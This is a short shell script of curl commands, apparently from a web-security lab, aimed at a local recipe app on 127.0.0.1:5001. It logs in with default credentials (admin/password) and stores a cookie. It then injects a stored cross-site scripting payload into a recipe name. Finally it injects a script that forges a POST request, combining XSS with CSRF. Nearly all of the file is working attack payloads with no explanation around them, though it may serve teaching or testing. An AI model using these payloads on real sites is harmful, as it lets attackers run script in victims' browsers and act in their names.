# setting up the session
curl 127.0.0.1:5001/login \
  -X POST \
  -d "username=admin" \
  -d "password=password" \
  -c cookiefile

# doing XSS only
curl 127.0.0.1:5001/add_recipe \
  -b cookiefile \
  -X POST \
  -d "name=</h1><script>alert(1)</script><h1>" \
  -d "description=have fun :)"

# doing XSS & CSRF
curl 127.0.0.1:5001/add_recipe \
  -b cookiefile \
  -X POST \
  --data-urlencode "name=</h1><script>var xhr = new XMLHttpRequest();xhr.open('POST','http://127.0.0.1:5001/add_recipe');xhr.setRequestHeader('Content-type','application/x-www-form-urlencoded');xhr.send('name=CSRF&description=SUCCEED')</script><h1>XSS" \
  -d "description=SUCCEED"